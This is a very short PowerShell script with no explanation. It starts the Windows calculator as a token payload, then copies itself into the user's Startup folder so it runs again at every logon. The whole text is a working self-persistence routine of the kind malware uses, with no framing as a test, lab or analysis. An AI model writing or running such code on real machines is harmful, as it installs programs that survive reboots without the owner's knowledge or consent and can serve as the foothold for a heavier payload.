Start-Process calc.exe
Copy-Item $MyInvocation.MyCommand.Path ([Environment]::GetFolderPath("Startup")) -Force
